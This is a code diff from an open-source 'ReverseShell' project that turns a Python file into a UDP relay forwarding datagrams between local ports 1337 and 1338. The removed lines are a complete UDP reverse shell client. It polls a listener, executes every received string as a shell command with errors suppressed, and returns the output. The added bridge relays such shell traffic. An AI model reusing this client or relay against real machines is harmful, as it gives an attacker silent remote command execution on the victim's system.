@@ -2,8 +2,8 @@
 # -*- coding: utf-8 -*-
 
 ###################
-#    This package implements an advanced reverse shell console.
-#    Copyright (C) 2023  Maurice Lambert
+#    UDP bridge for ReverseShell.
+#    Copyright (C) 2023  ReverseShell
 
 #    This program is free software: you can redistribute it and/or modify
 #    it under the terms of the GNU General Public License as published by
@@ -19,49 +19,53 @@
 #    along with this program.  If not, see <https://www.gnu.org/licenses/>.
 ###################
 
-"""
-This package implements an advanced reverse shell
-console (supports: TCP, UDP, IRC, HTTP and DNS).
-"""
+'''
+UDP bridge for ReverseShell.
+'''
 
 __version__ = "0.0.1"
 __author__ = "Maurice Lambert"
 __author_email__ = "mauricelambert434@gmail.com"
 __maintainer__ = "Maurice Lambert"
 __maintainer_email__ = "mauricelambert434@gmail.com"
-__description__ = """
-This package implements an advanced reverse shell
-console (supports: TCP, UDP, IRC, HTTP and DNS).
-"""
-license = "GPL-3.0 License"
+__description__ = '''
+UDP bridge for ReverseShell.
+'''
 __url__ = "https://github.com/mauricelambert/ReverseShell"
 
-copyright = """
+# __all__ = []
+
+__license__ = "GPL-3.0 License"
+__copyright__ = '''
 ReverseShell  Copyright (C) 2023  Maurice Lambert
 This program comes with ABSOLUTELY NO WARRANTY.
 This is free software, and you are welcome to redistribute it
 under certain conditions.
-"""
-__license__ = license
-__copyright__ = copyright
-
-__all__ = []
+'''
+copyright = __copyright__
+license = __license__
 
 print(copyright)
 
-from time import sleep
-from contextlib import suppress
-from subprocess import run, PIPE
 from socket import socket, AF_INET, SOCK_DGRAM
+from contextlib import suppress
+
+use_timeout = True
+
+address_server = ('127.0.0.1', 1337)
+address_destination = ('127.0.0.1', 1338)
 
 while True:
     with suppress(Exception):
-        sleep(1)
-        s = socket(AF_INET, SOCK_DGRAM)
-        data = b" "
+        socket_server = socket(AF_INET, SOCK_DGRAM)
+        socket_server.bind(address_server)
+        socket_client = socket(AF_INET, SOCK_DGRAM)
+
         while True:
-            s.sendto(data, ("127.0.0.1", 1337))
-            data = s.recv(65535).decode()
-            p = run(data, shell=True, stdout=PIPE, stderr=PIPE)
-            data = p.stdout or p.stderr or b" "
-        s.close()
+            data, address_client = socket_server.recvfrom(65535)
+            socket_client.sendto(data, address_destination)
+            data = socket_client.recv(65535)
+            socket_server.sendto(data, address_client)
+
+        socket_client.close()
+        socket_server.close()
